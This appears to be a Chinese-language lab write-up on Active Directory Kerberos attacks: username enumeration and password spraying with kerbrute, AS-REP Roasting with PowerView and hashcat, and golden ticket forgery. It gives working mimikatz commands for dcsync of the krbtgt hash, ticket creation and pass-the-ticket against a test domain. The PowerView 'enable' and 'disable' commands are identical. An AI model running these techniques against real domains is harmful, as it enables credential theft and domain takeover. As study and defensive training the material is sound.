## 用户名枚举

当机器不在域中时，可以利用AS_REQ的原理来枚举域用户，在AS_REQ阶段，client中提交了client name，当用户不存在时返回包提示KDC_ERR_C_PRINCIPAL_UNKNOWN，用户名正确就返回TGT票据。可以通过kerberos pre-auth从域外对域用户进行枚举

github上有编译好的现成的工具：https://github.com/ropnop/kerbrute/releases

![usereunm](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/as/usereunm.png)

使用编译好的工具，我们能够在一台不在域内的机器，但能和DC进行通信的机器上枚举域内用户

也可以使用python脚本：https://github.com/3gstudent/pyKerbrute

+ 为什么一定的得是域外且能够与DC进行通信的机器

  其实不然，我们在域内的机器上运行相同的脚本同样能够枚举出用户名，但在枚举过程中缺失了一个hacker用户，通过抓取流量来进行分析。通过流量的观察，域内机器进行了一次AS-REQ请求，域外机器请求了两次，二者的返回包提示都相同，估计是精确性的问题，没有接着深究。

+ AS-REQ请求过程不是需要使用用户的密码hash进行加密吗，为什么没有域凭证的域外机器能够请求成功

  该工具是通过kerberos的报错来进行判断的，只需要提供用户名就能进行用户枚举，只是利用了用户名是否存在的报错不一致性

## 密码喷洒攻击(Password Spraying)

传统的密码猜测，通过固定的用户名，然后猜测密码，很有可能导致账户被封禁。而密码喷洒攻击正好与其相反，密码喷洒通过固定的密码来猜测用户名。

Kerbrute同样可以拿来验证密码。

![passwordspray](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/as/passwordspray.png)

登录成功会产生日志4768

![passwordspray2](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/as/passwordspray2.png)

一般来说密码错误会抛出错误代码24

![erroecode-24](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/erroecode-24.png)

该攻击同样可以在域外进行，但并不支持kerberos

![crackpexec](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/crackpexec.png)

## AS-REP Roasting攻击

对于域用户，如果设置了选项”Do not require Kerberos preauthentication”，此时向域控制器的88端口发送AS_REQ请求，对收到的AS_REP请求enc-part的cipher进行组合解密就能获得用户的明文。（enc-part底下的cipher，这部分是使用用户hash加密session-key)![np](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/np.png)

![enc-part](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/as/enc-part.png)

通过手动组装，前面32位16进制字符+$+后面的16进制字符得到repHash，`format("$krb5asrep$23${0}@{1}:{2}", userName, domain, repHash)`得到字符串

也可以使用工具自动抓取(方便很多，只需要自己添加加密规则即可)

![areproast](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/as/areproast.png)

将抓取到的内容手动添加规则

```
$krb5asrep$23$Administrator@hack.com:...............
```

为什么是23?

![23](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/as/23.png)

将完整的字符串交给hashcat就可以尝试破解。

+ kerberos的预身份验证

  kerberos的预身份验证其实就是AS_REQ&AS_REP的过程，如果用户关闭了这个过程，使用指定的用户去请求票据，此时域控不会做任何验证，直接返回TGT票据和加密的session-key,我们就能通过返回包来破解用户密码

+ 寻找关闭预身份验证的用户

  ```powershell
  Import-Module .\PowerView.ps1
  Get-DomainUser -PreauthNotRequired -Verbose
  ```

![finduser](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/finduser.png)

当然工具本身能够寻找符合标准的用户，并dump对应的cipher内容

+ 关闭/开启预身份验证

  ```powershell
  #开启
  Import-Module .\PowerView.ps1
  Set-DomainObject -Identity testb -XOR @{userAccountControl=4194304} -Verbose
  #关闭
  Import-Module .\PowerView.ps1
  Set-DomainObject -Identity testb -XOR @{userAccountControl=4194304} -Verbose
  ```

导出hash的方法也不只一种

类似：https://github.com/HarmJ0y/ASREPRoast 的powershell脚本也可以用

## 黄金票据(GoldenTicket)

我们知道kerberos的认证流程，AS_REP会返回使用krbtgt用户的htlm hash加密的TGT,如果我们能够拿到高权限的TGT，就可以发送给TGS来申请任意服务的ST。金票就是利用这一点，因此制作金票需要的条件

+ krbtgt用户的ntlm-hash
+ 域名称
+ 域的SID值
+ 伪造的用户名，任意即可

这里使用mimikatz简单了解一下黄金票据的制作

+ 抓取krbtgt用户的ntlm-hash

  ```shell
  mimikatz "lsadump::dcsync /domain:hack.com /user:krbtgt"
  ```

  ![krbtgt-ntlm-hash](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/krbtgt-ntlm-hash.png)

+ 获取域的sid

  ```
  whoami /user
  ```

  事实上不用再次获取，上个步骤中就已经获取到了域的sid

+ 使用mimikatz生成黄金票据

  ```shell
  mimikatz.exe "kerberos::golden /domain:hack.com /sid:S-1-5-21-754643614-3937478331-2139222398 /krbtgt:8d0e4e5d28d91ac99f7b77368455d9b7 /user:testuser /ticket:golden.kirbi"
  ```

  ![make-ticket](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/make-ticket.png)

+ 利用生成的票据

  ```shell
  kerberos::purge
  kerberos::ptt golden.kirbi
  kerberos::list
  ```

  将生成的票据导入到内存中，就能够访问域控机器的盘符(域内的任意一台机器)